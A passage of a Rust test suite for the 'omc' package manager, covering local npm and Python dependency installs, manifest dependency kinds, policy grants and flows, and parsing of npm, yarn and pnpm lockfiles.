    let report = install_project(&LinkOptions::new(dir.path())).unwrap();

    assert_eq!(report.npm_bins, 1);
    assert_eq!(
        fs::read_to_string(dir.path().join("node_modules/direct-pkg/index.js")).unwrap(),
        "module.exports = 43;\n"
    );
    assert!(dir.path().join("node_modules/.bin/direct-tool").exists());
    let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();
    assert_eq!(manifest.npm_local_paths, vec!["vendor/direct-pkg"]);
}

#[test]
fn installs_recursive_npm_local_path_dependencies() {
    let dir = tempfile::tempdir().unwrap();
    let parent = dir.path().join("vendor/parent-pkg");
    let child = parent.join("child-pkg");
    fs::create_dir_all(&child).unwrap();
    fs::write(
        parent.join("package.json"),
        r#"{
                "name": "parent-pkg",
                "version": "1.0.0",
                "bin": { "parent-bin": "cli.js" },
                "dependencies": {
                    "child-pkg": "file:./child-pkg",
                    "tar-dep": "file:./tar-dep-1.0.0.tgz"
                }
            }"#,
    )
    .unwrap();
    fs::write(
        parent.join("index.js"),
        "module.exports = require('child-pkg');\n",
    )
    .unwrap();
    fs::write(
        parent.join("cli.js"),
        "#!/usr/bin/env node\nconsole.log(require('child-pkg'));\n",
    )
    .unwrap();
    fs::write(
        child.join("package.json"),
        r#"{ "name": "child-pkg", "version": "1.0.0" }"#,
    )
    .unwrap();
    fs::write(child.join("index.js"), "module.exports = 44;\n").unwrap();
    fs::write(
        parent.join("tar-dep-1.0.0.tgz"),
        npm_tgz_for_test(r#"{ "name": "tar-dep", "version": "1.0.0" }"#),
    )
    .unwrap();

    add_manifest_npm_local_paths(
        dir.path(),
        &[PathBuf::from("vendor/parent-pkg")],
        ManifestDependencyKind::Production,
    )
    .unwrap();

    let report = install_project(&LinkOptions::new(dir.path())).unwrap();

    assert_eq!(report.npm_packages, 1);
    assert!(dir.path().join("node_modules/parent-pkg").exists());
    assert!(dir.path().join("node_modules/child-pkg").exists());
    assert!(dir
        .path()
        .join("node_modules/tar-dep/package.json")
        .exists());
    let lock = read_lockfile(dir.path().join("omc.lock")).unwrap();
    assert!(lock
        .packages
        .iter()
        .any(|package| package.name == "tar-dep"));
    let output = Command::new(dir.path().join("node_modules/.bin/parent-bin"))
        .output()
        .unwrap();
    assert!(output.status.success());
    assert_eq!(String::from_utf8_lossy(&output.stdout).trim(), "44");
}

#[test]
fn installs_package_json_local_directory_dependencies_recursively() {
    let dir = tempfile::tempdir().unwrap();
    let parent = dir.path().join("vendor/parent-pkg");
    let child = parent.join("child-pkg");
    fs::create_dir_all(&child).unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{
                "name": "local-dep-root",
                "dependencies": { "parent-pkg": "file:vendor/parent-pkg" }
            }"#,
    )
    .unwrap();
    fs::write(
        parent.join("package.json"),
        r#"{
                "name": "parent-pkg",
                "version": "1.0.0",
                "dependencies": {
                    "child-pkg": "file:./child-pkg",
                    "tar-dep": "file:./tar-dep-1.0.0.tgz"
                }
            }"#,
    )
    .unwrap();
    fs::write(
        parent.join("index.js"),
        "module.exports = require('child-pkg') + require('tar-dep');\n",
    )
    .unwrap();
    fs::write(
        child.join("package.json"),
        r#"{ "name": "child-pkg", "version": "1.0.0" }"#,
    )
    .unwrap();
    fs::write(child.join("index.js"), "module.exports = 20;\n").unwrap();
    fs::write(
        parent.join("tar-dep-1.0.0.tgz"),
        npm_tgz_for_test(r#"{ "name": "tar-dep", "version": "1.0.0" }"#),
    )
    .unwrap();

    install_project(&LinkOptions::new(dir.path())).unwrap();

    assert!(dir.path().join("node_modules/parent-pkg").exists());
    assert!(dir.path().join("node_modules/child-pkg").exists());
    assert!(dir
        .path()
        .join("node_modules/tar-dep/package.json")
        .exists());
    let lock = read_lockfile(dir.path().join("omc.lock")).unwrap();
    assert!(lock
        .packages
        .iter()
        .any(|package| package.name == "tar-dep"));
    assert!(lock
        .local_sources
        .iter()
        .any(|source| source.name == "parent-pkg"));
    assert!(lock
        .local_sources
        .iter()
        .any(|source| source.name == "child-pkg"));
}

#[test]
fn dev_manifest_npm_local_paths_respect_omit_dev() {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join("vendor/dev-pkg")).unwrap();
    fs::write(
        dir.path().join("vendor/dev-pkg/package.json"),
        r#"{ "name": "dev-pkg" }"#,
    )
    .unwrap();

    add_manifest_npm_local_paths(
        dir.path(),
        &[PathBuf::from("vendor/dev-pkg")],
        ManifestDependencyKind::Dev,
    )
    .unwrap();

    let mut options = LinkOptions::new(dir.path());
    options.include_dev_dependencies = false;
    install_project(&options).unwrap();
    assert!(!dir.path().join("node_modules/dev-pkg").exists());

    options.include_dev_dependencies = true;
    install_project(&options).unwrap();
    assert!(dir.path().join("node_modules/dev-pkg").exists());
    let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();
    assert_eq!(manifest.npm_dev_local_paths, vec!["vendor/dev-pkg"]);
}

#[test]
fn manifest_npm_local_paths_preserve_dependency_kinds() {
    let dir = tempfile::tempdir().unwrap();

    add_manifest_npm_local_paths(
        dir.path(),
        &[PathBuf::from("vendor/optional-pkg")],
        ManifestDependencyKind::Optional,
    )
    .unwrap();
    add_manifest_npm_local_paths(
        dir.path(),
        &[PathBuf::from("vendor/peer-pkg")],
        ManifestDependencyKind::Peer,
    )
    .unwrap();
    add_manifest_npm_local_paths(
        dir.path(),
        &[PathBuf::from("vendor/optional-pkg")],
        ManifestDependencyKind::Dev,
    )
    .unwrap();

    let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();
    assert!(manifest.npm_local_paths.is_empty());
    assert_eq!(manifest.npm_dev_local_paths, vec!["vendor/optional-pkg"]);
    assert!(manifest.npm_optional_local_paths.is_empty());
    assert_eq!(manifest.npm_peer_local_paths, vec!["vendor/peer-pkg"]);
}

#[test]
fn install_project_compiles_python_local_source_artifacts() {
    let dir = tempfile::tempdir().unwrap();
    let local = dir.path().join("vendor/local-py");
    let src = local.join("src/local_py");
    fs::create_dir_all(&src).unwrap();
    fs::write(
        dir.path().join("requirements.txt"),
        "-e ./vendor/local-py\n",
    )
    .unwrap();
    fs::write(
        local.join("pyproject.toml"),
        r#"[project]
name = "Local_Py"
version = "0.2.0"
"#,
    )
    .unwrap();
    fs::write(src.join("__init__.py"), "VALUE = 'local'\n").unwrap();

    let report = install_project(&LinkOptions::new(dir.path())).unwrap();

    assert_eq!(report.pypi_packages, 0);
    assert_eq!(report.local_source_artifacts, 1);
    let local_paths =
        fs::read_to_string(dir.path().join(".omc").join("python").join("local-paths")).unwrap();
    assert_eq!(
        local_paths.trim(),
        fs::canonicalize(local.join("src"))
            .unwrap()
            .to_string_lossy()
    );
    let artifact_path = dir
        .path()
        .join(".omc/artifacts/pypi/local-py/0.2.0/omc.json");
    let artifact: OmcArtifact =
        serde_json::from_str(&fs::read_to_string(artifact_path).unwrap()).unwrap();
    verify_artifact_signature(&artifact).unwrap();
    assert_eq!(artifact.package.ecosystem, Ecosystem::Pypi);
    assert_eq!(artifact.package.name, "local-py");
    assert_eq!(artifact.package.version, "0.2.0");
    assert_eq!(artifact.verdict, Verdict::Accepted);
    let lock = read_lockfile(dir.path().join("omc.lock")).unwrap();
    assert_eq!(lock.local_sources.len(), 1);
    assert_eq!(lock.local_sources[0].ecosystem, Ecosystem::Pypi);
    assert_eq!(lock.local_sources[0].name, "local-py");
    assert_eq!(lock.local_sources[0].version, "0.2.0");
    assert_eq!(lock.local_sources[0].sha256, artifact.source_sha256);
}

#[test]
fn lock_project_updates_lock_without_installing_packages() {
    let dir = tempfile::tempdir().unwrap();
    let archive = dir.path().join("local-pkg-1.0.0.tgz");
    fs::write(
        &archive,
        npm_tgz_for_test(r#"{ "name": "local-pkg", "version": "1.0.0" }"#),
    )
    .unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{ "dependencies": { "local-pkg": "file:local-pkg-1.0.0.tgz" } }"#,
    )
    .unwrap();

    let reports = lock_project(&LinkOptions::new(dir.path())).unwrap();

    assert!(reports
        .iter()
        .any(|report| report.locked.name == "local-pkg"));
    let lock = read_lockfile(dir.path().join("omc.lock")).unwrap();
    assert!(lock
        .packages
        .iter()
        .any(|package| package.name == "local-pkg"));
    assert!(!dir.path().join("node_modules").exists());
}

#[test]
fn link_options_can_skip_project_requirement_discovery() {
    let dir = tempfile::tempdir().unwrap();
    let archive = dir.path().join("local-pkg-1.0.0.tgz");
    fs::write(
        &archive,
        npm_tgz_for_test(r#"{ "name": "local-pkg", "version": "1.0.0" }"#),
    )
    .unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{ "dependencies": { "local-pkg": "file:local-pkg-1.0.0.tgz" } }"#,
    )
    .unwrap();
    fs::write(dir.path().join("requirements.txt"), "requests==2.32.3\n").unwrap();

    let mut options = LinkOptions::new(dir.path());
    options.discover_project_requirements = false;
    let reports = lock_project(&options).unwrap();
    let lock = read_lockfile(dir.path().join("omc.lock")).unwrap();

    assert!(reports.is_empty());
    assert!(lock.packages.is_empty());
}

#[test]
fn reads_workspace_package_json_specs_from_object_form() {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join("apps/web")).unwrap();

    let package_json = dir.path().join("package.json");
    fs::write(
        &package_json,
        r#"{
                "name": "workspace-root",
                "workspaces": {
                    "packages": ["apps/*"]
                }
            }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("apps/web/package.json"),
        r#"{ "name": "web", "dependencies": { "web-dep": "1.2.3" } }"#,
    )
    .unwrap();

    let specs = read_package_json_specs(&package_json, true).unwrap();
    assert!(has_spec(&specs, "web-dep", "1.2.3"));
}

#[test]
fn removes_manifest_dependencies() {
    let dir = tempfile::tempdir().unwrap();
    let manifest = OmcManifest {
        project: ProjectInfo {
            name: "remove-demo".to_owned(),
            version: "0.1.0".to_owned(),
        },
        dependencies: BTreeMap::from([("npm:left-pad".to_owned(), "1.3.0".to_owned())]),
        dev_dependencies: BTreeMap::from([("npm:is-odd".to_owned(), "3.0.1".to_owned())]),
        optional_dependencies: BTreeMap::from([(
            "npm:optional-left".to_owned(),
            "1.0.0".to_owned(),
        )]),
        peer_dependencies: BTreeMap::from([("npm:react".to_owned(), "18.2.0".to_owned())]),
        npm_local_paths: Vec::new(),
        npm_dev_local_paths: Vec::new(),
        npm_optional_local_paths: Vec::new(),
        npm_peer_local_paths: Vec::new(),
        policy: ManifestPolicy {
            allow: vec!["http:api.example.com".to_owned()],
            allow_flow: Vec::new(),
            min_release_age: None,
        },
        registries: ManifestRegistries::default(),
    };
    fs::write(
        dir.path().join("omc.toml"),
        toml::to_string_pretty(&manifest).unwrap(),
    )
    .unwrap();

    let removed =
        remove_manifest_dependency(dir.path(), &PackageSpec::parse("npm:left-pad").unwrap())
            .unwrap();
    let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();

    assert!(removed);
    assert!(manifest.dependencies.is_empty());
    assert_eq!(
        manifest.dev_dependencies,
        BTreeMap::from([("npm:is-odd".to_owned(), "3.0.1".to_owned())])
    );
    assert_eq!(
        manifest.optional_dependencies,
        BTreeMap::from([("npm:optional-left".to_owned(), "1.0.0".to_owned())])
    );
    assert_eq!(
        manifest.peer_dependencies,
        BTreeMap::from([("npm:react".to_owned(), "18.2.0".to_owned())])
    );
    assert_eq!(manifest.policy.allow, vec!["http:api.example.com"]);
}

#[test]
fn writes_manifest_dependency_kinds() {
    let dir = tempfile::tempdir().unwrap();
    let spec = PackageSpec::parse("npm:is-odd@3.0.1").unwrap();
    write_manifest_dependency(dir.path(), &spec, "3.0.1", ManifestDependencyKind::Dev).unwrap();
    let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();

    assert!(manifest.dependencies.is_empty());
    assert_eq!(
        manifest.dev_dependencies,
        BTreeMap::from([("npm:is-odd".to_owned(), "3.0.1".to_owned())])
    );

    write_manifest_dependency(dir.path(), &spec, "3.0.1", ManifestDependencyKind::Optional)
        .unwrap();
    let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();
    assert!(manifest.dependencies.is_empty());
    assert!(manifest.dev_dependencies.is_empty());
    assert_eq!(
        manifest.optional_dependencies,
        BTreeMap::from([("npm:is-odd".to_owned(), "3.0.1".to_owned())])
    );
    assert!(manifest.peer_dependencies.is_empty());

    write_manifest_dependency(dir.path(), &spec, "3.0.1", ManifestDependencyKind::Peer).unwrap();
    let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();
    assert!(manifest.dependencies.is_empty());
    assert!(manifest.dev_dependencies.is_empty());
    assert!(manifest.optional_dependencies.is_empty());
    assert_eq!(
        manifest.peer_dependencies,
        BTreeMap::from([("npm:is-odd".to_owned(), "3.0.1".to_owned())])
    );

    write_manifest_dependency(
        dir.path(),
        &spec,
        "3.0.1",
        ManifestDependencyKind::Production,
    )
    .unwrap();
    let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();
    assert_eq!(
        manifest.dependencies,
        BTreeMap::from([("npm:is-odd".to_owned(), "3.0.1".to_owned())])
    );
    assert!(manifest.dev_dependencies.is_empty());
    assert!(manifest.optional_dependencies.is_empty());
    assert!(manifest.peer_dependencies.is_empty());
}

#[test]
fn manifest_optional_and_peer_dependencies_are_runtime_inputs() {
    let dir = tempfile::tempdir().unwrap();
    let manifest = OmcManifest {
        project: ProjectInfo {
            name: "dependency-kind-demo".to_owned(),
            version: "0.1.0".to_owned(),
        },
        dependencies: BTreeMap::from([("npm:prod-pkg".to_owned(), "1.0.0".to_owned())]),
        dev_dependencies: BTreeMap::from([("npm:dev-pkg".to_owned(), "2.0.0".to_owned())]),
        optional_dependencies: BTreeMap::from([(
            "npm:optional-pkg".to_owned(),
            "3.0.0".to_owned(),
        )]),
        peer_dependencies: BTreeMap::from([("npm:peer-pkg".to_owned(), "4.0.0".to_owned())]),
        npm_local_paths: Vec::new(),
        npm_dev_local_paths: Vec::new(),
        npm_optional_local_paths: Vec::new(),
        npm_peer_local_paths: Vec::new(),
        policy: ManifestPolicy::default(),
        registries: ManifestRegistries::default(),
    };
    fs::write(
        dir.path().join("omc.toml"),
        toml::to_string_pretty(&manifest).unwrap(),
    )
    .unwrap();

    let mut production_options = LinkOptions::new(dir.path());
    production_options.include_dev_dependencies = false;
    production_options.discover_project_requirements = false;
    let production_specs = project_requested_specs(&mut production_options, false).unwrap();
    assert!(has_spec(&production_specs, "prod-pkg", "1.0.0"));
    assert!(has_spec(&production_specs, "optional-pkg", "3.0.0"));
    assert!(has_spec(&production_specs, "peer-pkg", "4.0.0"));
    assert!(!has_spec(&production_specs, "dev-pkg", "2.0.0"));

    let mut dev_options = LinkOptions::new(dir.path());
    dev_options.include_dev_dependencies = true;
    dev_options.discover_project_requirements = false;
    let dev_specs = project_requested_specs(&mut dev_options, false).unwrap();
    assert!(has_spec(&dev_specs, "dev-pkg", "2.0.0"));

    let mut omit_options = LinkOptions::new(dir.path());
    omit_options.include_dev_dependencies = false;
    omit_options.include_optional_dependencies = false;
    omit_options.include_peer_dependencies = false;
    omit_options.discover_project_requirements = false;
    let omit_specs = project_requested_specs(&mut omit_options, false).unwrap();
    assert!(has_spec(&omit_specs, "prod-pkg", "1.0.0"));
    assert!(!has_spec(&omit_specs, "optional-pkg", "3.0.0"));
    assert!(!has_spec(&omit_specs, "peer-pkg", "4.0.0"));
}

#[test]
fn adds_manifest_policy_grants() {
    let dir = tempfile::tempdir().unwrap();
    let added = add_manifest_policy_grants(
        dir.path(),
        &[
            "http:api.example.com".to_owned(),
            "env:API_TOKEN".to_owned(),
            "http:api.example.com".to_owned(),
        ],
    )
    .unwrap();
    let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();

    assert_eq!(
        added,
        vec![
            "http:api.example.com".to_owned(),
            "env.read:API_TOKEN".to_owned()
        ]
    );
    assert_eq!(
        manifest.policy.allow,
        vec![
            "env.read:API_TOKEN".to_owned(),
            "http:api.example.com".to_owned()
        ]
    );
}

#[test]
fn adds_manifest_policy_flows() {
    let dir = tempfile::tempdir().unwrap();
    let added = add_manifest_policy_flows(
        dir.path(),
        &[
            "env:API_TOKEN -> network:api.example.com".to_owned(),
            "env:API_TOKEN->network:api.example.com".to_owned(),
        ],
    )
    .unwrap();
    let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();

    assert_eq!(
        added,
        vec!["env:API_TOKEN->network:api.example.com".to_owned()]
    );
    assert_eq!(
        manifest.policy.allow_flow,
        vec!["env:API_TOKEN->network:api.example.com".to_owned()]
    );
}

#[test]
fn reads_npm_runtime_optional_and_peer_dependencies() {
    let version_doc = NpmVersion {
        version: "1.0.0".to_owned(),
        dist: NpmDist {
            tarball: "https://example.invalid/package.tgz".to_owned(),
            shasum: None,
            integrity: None,
        },
        os: None,
        cpu: None,
        libc: None,
        engines: None,
        scripts: None,
        dependencies: Some(BTreeMap::from([(
            "runtime".to_owned(),
            "^1.0.0".to_owned(),
        )])),
        optional_dependencies: Some(BTreeMap::from([(
            "optional-runtime".to_owned(),
            "^2.0.0".to_owned(),
        )])),
        bundle_dependencies: None,
        bundled_dependencies: None,
        peer_dependencies: Some(BTreeMap::from([
            ("required-peer".to_owned(), "^3.0.0".to_owned()),
            ("optional-peer".to_owned(), "^4.0.0".to_owned()),
        ])),
        peer_dependencies_meta: Some(BTreeMap::from([(
            "optional-peer".to_owned(),
            NpmPeerDependencyMeta { optional: true },
        )])),
    };

    let dependencies = npm_runtime_dependencies(&version_doc);
    assert!(dependencies
        .iter()
        .any(|dependency| dependency.spec.name == "runtime"
            && dependency.spec.version.as_deref() == Some("^1.0.0")
            && !dependency.optional
            && !dependency.peer));
    assert!(dependencies
        .iter()
        .any(|dependency| dependency.spec.name == "optional-runtime"
            && dependency.spec.version.as_deref() == Some("^2.0.0")
            && dependency.optional
            && !dependency.peer));
    assert!(dependencies
        .iter()
        .any(|dependency| dependency.spec.name == "required-peer"
            && dependency.spec.version.as_deref() == Some("^3.0.0")
            && !dependency.optional
            && dependency.peer));
    assert!(!dependencies
        .iter()
        .any(|dependency| dependency.spec.name == "optional-peer"));
}

#[test]
fn evaluates_npm_platform_lists() {
    assert!(npm_string_list_allows(
        Some(&NpmStringList::Many(vec![current_npm_os().to_owned()])),
        Some(current_npm_os())
    ));
    assert!(!npm_string_list_allows(
        Some(&NpmStringList::Many(vec![format!("!{}", current_npm_os())])),
        Some(current_npm_os())
    ));
    assert!(npm_string_list_allows(
        Some(&NpmStringList::Many(vec![
            "!definitely-not-this-os".to_owned()
        ])),
        Some(current_npm_os())
    ));
    assert!(!npm_string_list_allows(
        Some(&NpmStringList::Many(vec![
            "definitely-not-this-os".to_owned()
        ])),
        Some(current_npm_os())
    ));
}

#[test]
fn evaluates_npm_engine_requirements() {
    let node = Version::new(20, 11, 1);

    assert!(npm_engine_requirement_satisfied(&node, ">=18"));
    assert!(npm_engine_requirement_satisfied(&node, ">= 18 < 21"));
    assert!(npm_engine_requirement_satisfied(&node, "^16 || >=20"));
    assert!(!npm_engine_requirement_satisfied(&node, "<18"));
    assert!(!npm_engine_requirement_satisfied(&node, "^16 || ^18"));
}

#[test]
fn skips_npm_bundled_dependencies() {
    let version_doc = NpmVersion {
        version: "1.0.0".to_owned(),
        dist: NpmDist {
            tarball: "https://example.invalid/package.tgz".to_owned(),
            shasum: None,
            integrity: None,
        },
        os: None,
        cpu: None,
        libc: None,
        engines: None,
        scripts: None,
        dependencies: Some(BTreeMap::from([
            ("bundled-runtime".to_owned(), "^1.0.0".to_owned()),
            ("external-runtime".to_owned(), "^2.0.0".to_owned()),
        ])),
        optional_dependencies: Some(BTreeMap::from([(
            "bundled-optional".to_owned(),
            "^3.0.0".to_owned(),
        )])),
        bundle_dependencies: Some(NpmStringList::Many(vec![
            "bundled-runtime".to_owned(),
            "bundled-optional".to_owned(),
        ])),
        bundled_dependencies: None,
        peer_dependencies: None,
        peer_dependencies_meta: None,
    };

    let dependencies = npm_runtime_dependencies(&version_doc);
    assert!(dependencies
        .iter()
        .any(|dependency| dependency.spec.name == "external-runtime"));
    assert!(!dependencies
        .iter()
        .any(|dependency| dependency.spec.name == "bundled-runtime"));
    assert!(!dependencies
        .iter()
        .any(|dependency| dependency.spec.name == "bundled-optional"));
}

#[test]
fn supports_boolean_npm_bundle_dependencies() {
    let version_doc = NpmVersion {
        version: "1.0.0".to_owned(),
        dist: NpmDist {
            tarball: "https://example.invalid/package.tgz".to_owned(),
            shasum: None,
            integrity: None,
        },
        os: None,
        cpu: None,
        libc: None,
        engines: None,
        scripts: None,
        dependencies: Some(BTreeMap::from([(
            "bundled-runtime".to_owned(),
            "^1.0.0".to_owned(),
        )])),
        optional_dependencies: None,
        bundle_dependencies: Some(NpmStringList::Bool(true)),
        bundled_dependencies: None,
        peer_dependencies: None,
        peer_dependencies_meta: None,
    };

    assert!(npm_runtime_dependencies(&version_doc).is_empty());
}

#[test]
fn reads_package_lock_constraints_for_unique_versions() {
    let dir = tempfile::tempdir().unwrap();
    let package_lock = dir.path().join("package-lock.json");
    fs::write(
        &package_lock,
        r#"{
                "lockfileVersion": 3,
                "packages": {
                    "": { "name": "demo", "version": "0.1.0" },
                    "node_modules/is-odd": { "version": "3.0.1" },
                    "node_modules/@scope/pkg": { "version": "1.2.3" },
                    "node_modules/a/node_modules/dup": { "version": "1.0.0" },
                    "node_modules/b/node_modules/dup": { "version": "2.0.0" }
                }
            }"#,
    )
    .unwrap();

    let constraints = read_package_lock_requirements(&package_lock)
        .unwrap()
        .constraints;
    assert_eq!(
        constraints.get("npm:is-odd").map(String::as_str),
        Some("3.0.1")
    );
    assert_eq!(
        constraints.get("npm:@scope/pkg").map(String::as_str),
        Some("1.2.3")
    );
    assert!(!constraints.contains_key("npm:dup"));
}

#[test]
fn reads_package_lock_integrities_for_unique_versions() {
    let dir = tempfile::tempdir().unwrap();
    let package_lock = dir.path().join("package-lock.json");
    fs::write(
            &package_lock,
            r#"{
                "lockfileVersion": 3,
                "packages": {
                    "": { "name": "demo", "version": "0.1.0" },
                    "node_modules/is-odd": {
                        "version": "3.0.1",
                        "integrity": "sha512-FGl0QHAcOIX3yNX6pZ8za0ccqGMyA07/DT/dwC3JsYuDVuhA21SCPI/S8svQkGlpzxMs+Lucc9x2m0/9gXvSPQ=="
                    },
                    "node_modules/a/node_modules/dup": {
                        "version": "1.0.0",
                        "integrity": "sha512-one"
                    },
                    "node_modules/b/node_modules/dup": {
                        "version": "2.0.0",
                        "integrity": "sha512-two"
                    }
                },
                "dependencies": {
                    "legacy": {
                        "version": "4.0.0",
                        "integrity": "sha1-Hl3LtZt1PLHUbiNNj2GAKFuLhq0="
                    }
                }
            }"#,
        )
        .unwrap();

    let requirements = read_package_lock_requirements(&package_lock).unwrap();
    assert_eq!(
            requirements
                .npm_integrities
                .get("npm:is-odd")
                .and_then(|values| values.iter().next())
                .map(String::as_str),
            Some(
                "sha512-FGl0QHAcOIX3yNX6pZ8za0ccqGMyA07/DT/dwC3JsYuDVuhA21SCPI/S8svQkGlpzxMs+Lucc9x2m0/9gXvSPQ=="
            )
        );
    assert_eq!(
        requirements
            .npm_integrities
            .get("npm:legacy")
            .and_then(|values| values.iter().next())
            .map(String::as_str),
        Some("sha1-Hl3LtZt1PLHUbiNNj2GAKFuLhq0=")
    );
    assert!(!requirements.npm_integrities.contains_key("npm:dup"));
}

#[test]
fn reads_package_lock_resolved_urls_for_unique_versions() {
    let dir = tempfile::tempdir().unwrap();
    let package_lock = dir.path().join("package-lock.json");
    fs::write(
        &package_lock,
        r#"{
                "lockfileVersion": 3,
                "packages": {
                    "": { "name": "demo", "version": "0.1.0" },
                    "node_modules/is-odd": {
                        "version": "3.0.1",
                        "resolved": "https://registry.example.invalid/is-odd-3.0.1.tgz"
                    },
                    "node_modules/a/node_modules/dup": {
                        "version": "1.0.0",
                        "resolved": "https://registry.example.invalid/dup-1.0.0.tgz"
                    },
                    "node_modules/b/node_modules/dup": {
                        "version": "2.0.0",
                        "resolved": "https://registry.example.invalid/dup-2.0.0.tgz"
                    }
                },
                "dependencies": {
                    "legacy": {
                        "version": "4.0.0",
                        "resolved": "https://registry.example.invalid/legacy-4.0.0.tgz"
                    }
                }
            }"#,
    )
    .unwrap();

    let requirements = read_package_lock_requirements(&package_lock).unwrap();
    assert_eq!(
        requirements
            .npm_resolved
            .get("npm:is-odd")
            .map(String::as_str),
        Some("https://registry.example.invalid/is-odd-3.0.1.tgz")
    );
    assert_eq!(
        requirements
            .npm_resolved
            .get("npm:legacy")
            .map(String::as_str),
        Some("https://registry.example.invalid/legacy-4.0.0.tgz")
    );
    assert!(!requirements.npm_resolved.contains_key("npm:dup"));
}

#[test]
fn reads_yarn_lock_constraints_integrities_and_urls() {
    let dir = tempfile::tempdir().unwrap();
    let yarn_lock = dir.path().join("yarn.lock");
    fs::write(
            &yarn_lock,
            r#"# yarn lockfile v1

left-pad@^1.0.0, "left-pad@~1.1.0":
  version "1.1.3"
  resolved "https://registry.yarnpkg.com/left-pad/-/left-pad-1.1.3.tgz#612f61c0f5c20ba82e3d8f3f211f98d7bc86dca5"
  integrity sha512-leftpad

"@scope/pkg@^1.0.0":
  version "1.2.3"
  resolved "https://registry.yarnpkg.com/@scope/pkg/-/pkg-1.2.3.tgz"

"alias@npm:real-name@^3.0.0":
  version "3.1.0"

dup@^1.0.0:
  version "1.0.0"

dup@^2.0.0:
  version "2.0.0"
"#,
        )
        .unwrap();

    let requirements = read_yarn_lock_requirements(&yarn_lock).unwrap();
    assert_eq!(
        requirements
            .constraints
            .get("npm:left-pad")
            .map(String::as_str),
        Some("1.1.3")
    );
    assert_eq!(
        requirements
            .constraints
            .get("npm:@scope/pkg")
            .map(String::as_str),
        Some("1.2.3")
    );
    assert_eq!(
        requirements
            .constraints
            .get("npm:alias")
            .map(String::as_str),
        Some("3.1.0")
    );
    assert_eq!(
        requirements
            .npm_integrities
            .get("npm:left-pad")
            .and_then(|values| values.iter().next())
            .map(String::as_str),
        Some("sha512-leftpad")
    );
    assert_eq!(
            requirements
                .npm_resolved
                .get("npm:left-pad")
                .map(String::as_str),
            Some(
                "https://registry.yarnpkg.com/left-pad/-/left-pad-1.1.3.tgz#612f61c0f5c20ba82e3d8f3f211f98d7bc86dca5"
            )
        );
    assert!(!requirements.constraints.contains_key("npm:dup"));
    assert!(!requirements.npm_resolved.contains_key("npm:dup"));
}

#[test]
fn discovers_yarn_lock_constraints() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{ "dependencies": { "left-pad": "^1.0.0" } }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("yarn.lock"),
        r#"left-pad@^1.0.0:
  version "1.1.3"
  resolved "https://registry.yarnpkg.com/left-pad/-/left-pad-1.1.3.tgz"
"#,
    )
    .unwrap();

    let discovered = discover_project_requirements(dir.path()).unwrap();
    assert!(discovered
        .specs
        .iter()
        .any(|spec| spec.name == "left-pad" && spec.version.as_deref() == Some("^1.0.0")));
    assert_eq!(
        discovered
            .constraints
            .get("npm:left-pad")
            .map(String::as_str),
        Some("1.1.3")
    );
    assert_eq!(
        discovered
            .npm_resolved
            .get("npm:left-pad")
            .map(String::as_str),
        Some("https://registry.yarnpkg.com/left-pad/-/left-pad-1.1.3.tgz")
    );
}

#[test]
fn reads_pnpm_lock_constraints_integrities_urls_and_importers() {
    let dir = tempfile::tempdir().unwrap();
    let pnpm_lock = dir.path().join("pnpm-lock.yaml");
    fs::write(
        &pnpm_lock,
        r#"lockfileVersion: '9.0'

importers:
  .:
    dependencies:
      left-pad:
        specifier: ^1.0.0
        version: 1.1.3
    optionalDependencies:
      is-even:
        specifier: ^1.0.0
        version: 1.0.0
    devDependencies:
      which:
        specifier: ^2.0.0
        version: 2.0.2

packages:
  left-pad@1.1.3:
    resolution:
      integrity: sha512-leftpad
      tarball: https://registry.example.invalid/left-pad-1.1.3.tgz
  is-even@1.0.0:
    resolution:
      integrity: sha512-iseven
  which@2.0.2:
    resolution:
      integrity: sha512-which
  dup@1.0.0:
    resolution:
      integrity: sha512-one
  dup@2.0.0:
    resolution:
      integrity: sha512-two
"#,
    )
    .unwrap();

    let production =
        read_pnpm_lock_requirements(&pnpm_lock, DependencySelection::with_dev(false)).unwrap();
    assert!(has_spec(&production.specs, "left-pad", "1.1.3"));
    assert!(has_spec(&production.specs, "is-even", "1.0.0"));
    assert!(!production.specs.iter().any(|spec| spec.name == "which"));
    assert_eq!(
        production
            .constraints
            .get("npm:left-pad")
            .map(String::as_str),
        Some("1.1.3")
    );
    assert_eq!(
        production
            .npm_integrities
            .get("npm:left-pad")
            .and_then(|integrities| integrities.iter().next())
            .map(String::as_str),
        Some("sha512-leftpad")
    );
    assert_eq!(
        production
            .npm_resolved
            .get("npm:left-pad")
            .map(String::as_str),
        Some("https://registry.example.invalid/left-pad-1.1.3.tgz")
    );
    assert!(!production.constraints.contains_key("npm:dup"));

    let dev = read_pnpm_lock_requirements(&pnpm_lock, DependencySelection::with_dev(true)).unwrap();
    assert!(has_spec(&dev.specs, "which", "2.0.2"));
}

#[test]
fn discovers_pnpm_lock_requirements() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("pnpm-lock.yaml"),
        r#"lockfileVersion: '9.0'
importers:
  .:
    dependencies:
      left-pad:
        specifier: ^1.0.0
        version: 1.1.3
packages:
  left-pad@1.1.3:
    resolution: {}
"#,
    )
    .unwrap();

    let discovered = discover_project_requirements(dir.path()).unwrap();
    assert!(has_spec(&discovered.specs, "left-pad", "1.1.3"));
    assert_eq!(
        discovered
            .constraints
            .get("npm:left-pad")
            .map(String::as_str),
        Some("1.1.3")
    );
}

#[test]
fn resolves_npm_from_lockfile_tarball_url() {
    let mut options = LinkOptions::new(".");
    options
        .constraints
        .insert("npm:left-pad".to_owned(), "1.3.0".to_owned());
    options.npm_resolved.insert(
        "npm:left-pad".to_owned(),
